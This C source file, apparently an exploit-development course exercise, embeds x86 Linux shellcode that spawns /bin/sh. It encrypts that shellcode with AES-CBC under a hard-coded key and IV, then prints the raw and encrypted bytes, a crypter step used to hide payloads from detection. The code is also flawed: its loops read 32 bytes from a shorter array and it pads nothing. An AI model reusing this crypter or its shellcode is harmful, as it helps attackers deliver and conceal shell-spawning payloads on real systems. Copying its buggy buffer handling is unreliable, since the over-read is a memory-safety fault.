#include <stdio.h>
#include <string.h>
#include <stdint.h>

#define CBC 1

#include "aes.h"

int main() {

struct AES_ctx ctx;

uint8_t key[] = "32slaexplotation";
uint8_t iv[]  = "THis_is_a_testiv";
uint8_t str[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

printf("\n The shellcode to be encrypted: \n\n");
for (int i = 0; i < 32; ++i) {
    printf("\\x%02x", str[i]);
}

AES_init_ctx_iv(&ctx, key, iv);
AES_CBC_encrypt_buffer(&ctx, str, 32);

printf("\n\n The encrypted shellcode: \n\n");

for (int i = 0; i < 32; ++i) {
    printf("\\x%02x", str[i]);
}

/*printf("\n\n Decrypted\n\n");


AES_init_ctx_iv(&ctx, key, iv);
AES_CBC_decrypt_buffer(&ctx, str, 32);

for (int i = 0; i < sizeof(str)-1; ++i) {
    printf("\\x%02x", str[i]);
}

*/
printf("\n\n");

}

